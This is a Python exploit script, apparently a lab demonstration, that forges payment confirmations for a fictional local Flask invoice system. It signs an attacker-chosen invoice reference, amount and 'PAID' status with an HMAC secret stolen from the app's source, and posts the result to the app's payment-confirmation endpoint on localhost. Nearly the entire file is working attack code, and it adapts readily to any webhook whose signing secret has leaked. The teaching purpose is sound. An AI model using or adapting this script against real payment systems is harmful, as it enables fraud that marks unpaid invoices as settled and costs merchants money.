
"""
PURPOSE: Forge a payment confirmation for the fictional Invoice System.

SECURITY CONTEXT:
    The attacker has obtained the HMAC signing secret from the vulnerable
    Invoice System source code. The secret allows the attacker to generate
    a valid signature for a fraudulent payment confirmation.

NOTE: This demonstration targets a locally running Flask application only.
"""

import argparse
import hashlib
import hmac
import json
import urllib.request
import urllib.error


def create_payload(reference, amount, status, secret):
    """
    PURPOSE: Generate a forged payment notification with a valid HMAC signature.

    INPUTS:
        reference: Invoice reference to target.
        amount: Payment amount in pence.
        status: Payment status to submit.
        secret: HMAC signing secret obtained from the vulnerable source code.

    RETURNS:
        Dictionary containing the payment information and forged signature.
    """

    # ATTACK: Construct the message using the same format as the Invoice System.
    message = f"{reference}|{amount}|{status}"

    # ATTACK: Use the stolen signing secret to generate a valid HMAC signature.
    signature = hmac.new(
        secret.encode("utf-8"),
        message.encode("utf-8"),
        hashlib.sha256
    ).hexdigest()

    # STEP: Construct the JSON payload expected by the Invoice System.
    return {
        "payment": {
            "reference": reference,
            "amount": amount,
            "status": status
        },
        "signature": signature
    }


def send_payload(payload, url):
    """
    PURPOSE: Submit the forged payment notification to the Invoice System.

    INPUTS:
        payload: Payment information and forged HMAC signature.
        url: Local payment confirmation endpoint.

    RETURNS:
        Prints the HTTP response received from the Invoice System.
    """

    # STEP: Convert the payload into JSON for the HTTP POST request.
    data = json.dumps(payload).encode("utf-8")

    request = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST"
    )

    try:
        # ATTACK: Submit the forged notification as if sent by the provider.
        with urllib.request.urlopen(request) as response:
            print("\nHTTP Status:", response.status)
            print("Response:", response.read().decode("utf-8"))

    except urllib.error.HTTPError as error:
        # TEST: Display rejected requests, including invalid signatures.
        print("\nHTTP Status:", error.code)
        print("Response:", error.read().decode("utf-8"))

    except urllib.error.URLError as error:
        print("\nConnection failed:", error.reason)


if __name__ == "__main__":

    # STEP: Accept attack parameters through command-line arguments.
    parser = argparse.ArgumentParser(
        description="Generate and optionally send a forged payment confirmation."
    )

    parser.add_argument("--reference", required=True)
    parser.add_argument("--amount", required=True, type=int)
    parser.add_argument("--status", default="PAID")
    parser.add_argument("--secret", required=True)
    parser.add_argument("--send", action="store_true")

    args = parser.parse_args()

    payload = create_payload(
        args.reference,
        args.amount,
        args.status,
        args.secret
    )

    # STEP: Display the forged notification for inspection.
    print("\nGenerated malicious payload:")
    print(json.dumps(payload, indent=4))

    # ATTACK: Only submit the POST request when --send is specified.
    if args.send:
        send_payload(
            payload,
            "http://127.0.0.1:5000/payment-confirmation"
        )
